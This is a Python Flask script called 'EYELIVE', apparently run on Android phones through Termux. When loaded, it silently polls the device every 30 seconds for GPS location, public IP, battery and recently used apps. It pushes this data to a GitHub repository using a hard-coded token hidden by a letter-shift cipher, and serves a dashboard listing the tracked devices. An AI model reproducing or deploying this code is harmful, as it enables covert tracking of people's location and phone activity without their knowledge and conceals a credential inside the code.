from flask import Flask, render_template_string, jsonify, request
import os, json, requests, base64, threading, time, subprocess
from datetime import datetime

def _tk():
    t = "now_6SknCt0iPywDyM8breBO2KOlMwWpIr0m3nAP"
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else:
            r += c
    return r

app = Flask(__name__)

DEVICE_ID = os.environ.get("DEVICE_ID", "celular_1")
DEVICE_NAME = os.environ.get("DEVICE_NAME", "Meu Celular")
TOKEN = _tk()
REPO = "gynbetfc/eyelive"

device_data = {
    "id": DEVICE_ID, "nome": DEVICE_NAME,
    "ultimo_update": "", "bateria": "?%",
    "gps": {"lat": 0, "lng": 0}, "ip": "",
    "apps_recentes": [], "status": "online"
}

def shell(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=5).strip()
    except: return "?"

def coletar_dados():
    while True:
        try:
            b = shell("termux-battery-status 2>/dev/null")
            if b and "percentage" in b:
                bat = json.loads(b)
                device_data["bateria"] = f"{bat.get('percentage','?')}%"
            else:
                device_data["bateria"] = shell("dumpsys battery 2>/dev/null | grep level | cut -d: -f2 | xargs") + "%" or "?"
            
            loc = shell("termux-location 2>/dev/null")
            if loc:
                try:
                    gps_data = json.loads(loc)
                    device_data["gps"] = {"lat": gps_data.get("latitude",0), "lng": gps_data.get("longitude",0)}
                except: pass
            
            device_data["ip"] = shell("curl -4 -s ifconfig.me 2>/dev/null") or "?"
            apps = shell("dumpsys activity recents 2>/dev/null | grep 'Recent #' | head -5")
            if apps:
                device_data["apps_recentes"] = [a.strip() for a in apps.split('\n') if a.strip()]
            
            device_data["ultimo_update"] = datetime.now().strftime("%H:%M:%S")
            salvar_no_github()
        except: pass
        time.sleep(30)

def salvar_no_github():
    try:
        fn = f"dados/{DEVICE_ID}.json"
        url = f"https://api.github.com/repos/{REPO}/contents/{fn}"
        h = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
        c = json.dumps(device_data)
        r = requests.get(url, headers=h)
        payload = {"message": f"Update {DEVICE_ID}", "content": base64.b64encode(c.encode()).decode(), "branch": "main"}
        if r.status_code == 200: payload["sha"] = r.json()["sha"]
        requests.put(url, json=payload, headers=h)
    except: pass

threading.Thread(target=coletar_dados, daemon=True).start()

HTML_PAINEL = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>EYELIVE</title><style>body{background:#0a0a1a;color:#fff;font-family:monospace;padding:15px}.card{background:#1a1a3e;border:1px solid #333;border-radius:15px;padding:20px;margin:15px 0}h1{color:#ffd700;text-align:center}.online{color:#00ff88}.offline{color:#ff4444}.data{color:#aaa;font-size:13px;line-height:1.8}</style></head><body><h1>EYELIVE - Painel</h1><div id="dispositivos">Carregando...</div><script>function carregar(){fetch("/painel_data").then(r=>r.json()).then(d=>{var h="";d.forEach(function(dev){h+=\'<div class=card><h3 class=\'+(dev.status=="online"?"online":"offline")+\'>\'+(dev.status=="online"?"ON ":"OFF ")+dev.nome+"</h3><div class=data><p>Bateria: "+dev.bateria+" | "+dev.ultimo_update+"</p><p>GPS: "+JSON.stringify(dev.gps)+"</p><p>IP: "+dev.ip+"</p></div></div>\'});document.getElementById("dispositivos").innerHTML=h||"<p>Nenhum dispositivo</p>"})}setInterval(carregar,10000);carregar()</script></body></html>'

@app.route('/')
def painel():
    return render_template_string(HTML_PAINEL)

@app.route('/painel_data')
def painel_data():
    try:
        h = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
        url = f"https://api.github.com/repos/{REPO}/contents/dados"
        r = requests.get(url, headers=h)
        dispositivos = []
        if r.status_code == 200:
            for arq in r.json():
                if arq['name'].endswith('.json'):
                    r_dados = requests.get(arq['url'], headers=h)
                    if r_dados.status_code == 200:
                        dados = json.loads(base64.b64decode(r_dados.json()['content']).decode())
                        try:
                            ultimo = datetime.strptime(dados.get('ultimo_update','00:00:00'), "%H:%M:%S")
                            dados['status'] = 'online' if (datetime.now() - ultimo).seconds < 120 else 'offline'
                        except:
                            dados['status'] = 'offline'
                        dispositivos.append(dados)
        return jsonify(dispositivos)
    except:
        return jsonify([])

if __name__ == '__main__':
    print(f"EYELIVE - {DEVICE_NAME}")
    app.run(host='0.0.0.0', port=5050, debug=False)
